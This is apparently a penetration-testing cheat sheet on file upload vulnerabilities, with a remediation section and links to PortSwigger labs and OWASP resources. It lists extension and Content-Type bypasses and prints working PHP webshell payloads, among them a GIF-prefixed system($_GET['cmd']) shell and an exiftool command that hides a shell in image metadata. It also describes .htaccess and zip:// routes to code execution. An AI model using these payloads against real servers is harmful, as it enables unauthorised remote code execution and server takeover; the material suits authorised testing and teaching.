# File uploads

File upload functions can be used as a powerful vector for a number of high-severity attacks. 

## Steps

* Browse the site and find each upload functionality.
* Start with basic test by uploading a webshell using Weevely.
* If that fails, try the bypasses. If a bypass is successful, exploit further, or try another.
* Make report.

## Blacklisting bypass

Find the upload request, send it to Repeater and test which extension for the file is blacklisted by changing the `filename=` parameter:

```text
POST /images/upload/ HTTP/1.1
Host: target.com
...
Content-Disposition: form-data; name="uploaded"; filename="wut.php"
Content-Type: application/x-php
```

|          Extension          | Try                                      |
|:---------------------------:|:-----------------------------------------|
|             PHP             | .phtm, phtml, .phps, .pht, .php2, .php3, |
|                             | .php4, .php5, .shtml, .phar, .pgif, .inc |
|             ASP             | asp, .aspx, .cer, .asa                   |
|             Jsp             | .jsp, .jspx, .jsw, .jsv, .jspf           |
|         Coldfusion          | .cfm, .cfml, .cfc, .dbm                  |
| Using random capitalization | .pHp, .pHP5, .PhAr                       |

Find more in PayloadAllThings. If successful, exploit further, or try another type of validation or bypass.

## Whitelisting bypass

Try these extensions on the `filename=` parameter:

    file.jpg.php
    file.php.jpg
    file.php.blah123jpg
    file.php%00.jpg
    file.php\x00.jpg 
    file.php%00
    file.php%20
    file.php%0d%0a.jpg
    file.php.....
    file.php/
    file.php.\
    file.php#.png
    file.
    .html

## Content-Type validation

Change the `Content-Type: application/x-php` or `Content-Type : application/octet-stream` to `Content-Type: image/png` or `Content-Type: image/gif` or `Content-Type: image/jpg`.

## Content-Length validation

For `Content-Type: application/x-php`, try a small file payload:

    <?=`$_GET[x]`?>   
    <?=‘ls’;   Note : <? work for “short_open_tag=On” in php.ini ( Default=On )

If that works, try a better shell ...

## Magic bytes

Change `Content-Type: application/x-php` to `Content-Type: image/gif` and add the 
	 text `GIF89a;` before the shell-code.

```text
POST /images/upload/ HTTP/1.1
Host: target.com
...
Content-Disposition: form-data; name="uploaded"; filename="wut.php"
Content-Type: image/gif

GIF89a; <?php system($_GET['cmd']); ?>
```

See [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

## Magic bytes and metadata shell

Bypass `Content-Type` checks by setting the value of the `Content-Type` header to `image/png`, `text/plain`, `application/octet-stream`, and create a shell using the metadata using tool exiftool:

    exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

Try uploading the modified `img.jpg`.

## Uploading configuration files

Try, for example, uploading a `.htaccess` file [htshells](https://github.com/wireghoul/htshells) or a `.config` file. Code can be appended at the end of the file.

For example, uploading a `.htaccess` file with `AddType application/x-httpd-php .l33t`, instructs the Apache HTTP Server to execute PNG images as though they were PHP scripts. After that, upload a php webshell file with extension `.l33t`.

## Zip slip

If a site accepts `.zip` files, upload `.php` by compressing it into `.zip` and uploading it. Then visit `target.com/path?page=zip://path/file.zip%23rce.php`.

## Escalation

The impact of file upload vulnerabilities generally depends on two key factors:

* Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.
* What restrictions are imposed on the file once it has been successfully uploaded.

What can you achieve by exploiting file-upload: Remote code execution, SSRF, XSS, LFI, XXE, phishing, parameter pollution, disclosure of internal paths, SQL injection, DoS attack, etcetera:

|        Extension(s)        |               Impact               |
|:--------------------------:|:----------------------------------:|
| ASP, ASPX, PHP5, PHP, PHP3 |           Webshell, RCE            |
|            SVG             |       Stored XSS, SSRF, XXE        |
|            GIF             |          Stored XSS, SSRF          |
|            CSV             |           CSV injection            |
|            XML             |                XXE                 |
|            AVI             |             LFI, SSRF              |
|          HTML, JS          | HTML injection, XSS, Open redirect |
|         PNG, JPEG          |      Pixel flood attack (DoS)      |
|            ZIP             |          RCE via LFI, DoS          |
|         PDF, PPTX          |          SSRF, BLIND XXE           |
|            SCF             |                RCE                 |

In the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as `.php` and `.jsp`) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a webshell, effectively granting them full control over the server.

## Portswigger labs

* [Remote code execution via web shell upload](../burp/upload/1.md)
* [Web shell upload via Content-Type restriction bypass](../burp/upload/2.md)
* [Web shell upload via path traversal](../burp/upload/3.md)
* [Web shell upload via extension blacklist bypass](../burp/upload/4.md)
* [Web shell upload via obfuscated file extension](../burp/upload/5.md)
* [Remote code execution via polyglot web shell upload](../burp/upload/6.md)
* [Web shell upload via race condition](../burp/upload/7.md)
* [Race conditions](../techniques/race.md)

## Remediation

* Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.
* Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (`../`).
* Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
* Do not upload files to the server's permanent filesystem until they have been fully validated.
* If uploaded files are downloadable by users, supply an accurate non-generic `Content-Type` header, the `X-Content-Type-Options: nosniff` header, and also a `Content-Disposition` header that specifies that browsers should handle the file as an attachment.
* Enforce a size limit on uploaded files (for defence-in-depth, this can be implemented both within application code and in the web server’s configuration).
* Reject attempts to upload archive formats such as ZIP.
* As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.

## Resources

* [Portswigger: File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
* [OWASP:Test Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)
* [OWASP: File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
* [Weevely](https://www.blackhatethicalhacking.com/tools/weevely/)